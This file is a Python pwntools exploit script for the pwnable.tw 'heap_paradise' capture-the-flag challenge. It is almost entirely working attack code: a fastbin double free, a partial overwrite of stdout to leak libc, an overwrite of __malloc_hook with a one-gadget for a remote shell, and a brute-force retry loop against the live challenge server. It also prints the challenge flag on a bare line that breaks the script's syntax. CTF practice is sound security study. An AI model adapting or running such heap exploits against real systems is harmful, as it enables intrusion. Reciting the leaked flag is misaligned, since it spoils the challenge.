from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
p_name = './heap_paradise'
p = remote('chall.pwnable.tw', 10308)#process(p_name)
e = ELF(p_name)
libc = ELF('./libc_64.so.6')#ELF('/lib/x86_64-linux-gnu/libc.so.6')
FLAG{W3lc0m3_2_h3ap_p4radis3}
def cmd(command:int):
    p.recvuntil(b"You Choice:")
    p.sendline(str(command).encode())

def new(size:int, content):
    cmd(1)
    p.recvuntil(b"Size :")
    p.sendline(str(size).encode())
    p.recvuntil(b"Data :")
    p.send(content)

def free(index:int):
    cmd(2)
    p.recvuntil(b"Index :")
    p.sendline(str(index).encode())

def exp(hitbyte:int):
    new(0x68, b'arttnba3' * 2 + p64(0) + p64(0x71)) # idx 0
    new(0x68, b'arttnba3' * 2 + p64(0) + p64(0x31) + b'arttnba3' * 4 + p64(0) + p64(0x21)) # idx 1
    free(0)
    free(1)
    free(0)
    new(0x68, b'\x20') # idx 2 (0)
    new(0x68, b'arttnba3') # idx 3 (1)
    new(0x68, b'arttnba3') # idx 4 (0)
    new(0x68, b'arttnba3') # idx 5, fake chunk in idx 0
    free(0)
    new(0x68, b'arttnba3' * 2 + p64(0) + p64(0xa1)) # idx 6 (0)
    free(5)

    free(0)
    free(1)
    new(0x78, b'arttnba3' * 2 * 4 + p64(0) + p64(0x71) + b'\xa0') # idx 7, overwrite fd of idx 1 in fastbin
    new(0x68, b'arttnba3' * 4 + p64(0) + p64(0x71) + b'\xdd' + p8(hitbyte * 0x10 + 5)) # idx 8, partial overwrite in fastbin
    new(0x68, b'arttnba3') # idx 9 (1)
    new(0x68, b'A' * 3 + b'arttnba3' * 6 + p64(0xfbad2087 + 0x1800) + p64(0) * 3 + b'\x00') # idx 10, fake chunk on stdout
    leak = p.recv()
    locate = 0
    if b'\x7f' not in leak:
        raise Exception()
    for i in leak:
        if i == 0x7f:
            break
        locate += 1
    libc_leak = u64((leak[:locate+1])[-6:].ljust(8, b'\x00'))
    log.info('libc leak: ' + hex(libc_leak))
    #gdb.attach(p)
    libc_base = libc_leak - (libc.sym['_IO_2_1_stdout_'] & 0xffff00)
    log.success('libc base: ' + hex(libc_base))
    p.sendline(b'2')
    p.recvuntil(b"Index :")
    p.sendline(str(0).encode())
    free(7)
    free(1)
    new(0x78, b'arttnba3' * 2 * 4 + p64(0) + p64(0x71) + p64(libc_base + libc.sym['__malloc_hook'] - 0x23)) # idx 11
    new(0x68, b'arttnba3') # idx 12
    new(0x68, b'A' * 3 + b'arttnba3' * 2 + p64(libc_base + 0xef6c4)) # idx 13
    #gdb.attach(p)
    cmd(1)
    p.recvuntil(b"Size :")
    p.sendline(b'100')
    p.interactive()

if __name__ == '__main__':
    count = 1
    hit = 0
    while True:
        try:
            p = remote('chall.pwnable.tw', 10308)#process(['/lib/x86_64-linux-gnu/ld-2.23.so', p_name], env={'LD_PRELOAD':'./libc_64.so.6'})#
            print('try no.' + str(count) + ' time(s)')
            exp(hit)
        except Exception as e:
            print(e)
            p.close()
        count += 1
        hit += 1
        hit %= 0x10
